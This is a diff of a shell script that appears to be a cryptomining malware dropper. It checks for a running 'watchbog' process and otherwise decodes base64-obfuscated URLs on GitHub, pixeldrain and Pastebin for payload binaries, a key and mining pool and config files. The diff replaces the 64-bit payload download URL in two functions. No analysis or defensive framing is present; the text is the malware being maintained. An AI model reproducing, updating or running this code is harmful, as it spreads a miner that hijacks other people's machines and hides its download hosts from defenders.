@@ -185,7 +185,7 @@ function getencodedfile() {
 function download() {
 	pa=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
 	if [ ${pa} -eq 0 ];then
-		mi_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL2x1Y2t5c0JveXMvbHVja3MvcmF3L21hc3Rlci9qYXZhVXBkYXRlcw==|base64 -d)
+		mi_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3poYW5naHVjaGFuamlhbi8xL3Jhdy9tYXN0ZXIvamF2YXcNCg==|base64 -d)
 		mi_32=$(echo aHR0cHM6Ly9waXhlbGRyYWluLmNvbS9hcGkvZmlsZS9adVZXY2VXRw==|base64 -d)
 		der_ke=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3Lzh2cEZ3THFiCg==|base64 -d)
 		if [ "$me" != "root" ]; then
@@ -232,7 +232,7 @@ function download() {
 function testa() {
 	pb=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
 	if [ ${pb} -eq 0 ];then
-		st_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL2x1Y2t5c0JveXMvbHVja3MvcmF3L21hc3Rlci9qYXZhVXBkYXRlcw==|base64 -d)
+		st_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3poYW5naHVjaGFuamlhbi8xL3Jhdy9tYXN0ZXIvamF2YXcNCg==|base64 -d)
 		con_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1prejBkOUp6Cg==|base64 -d)
 		cpu_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L212U0VHbVI2Cg==|base64 -d)
 		poo_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NCMFRZQnZHCg==|base64 -d)
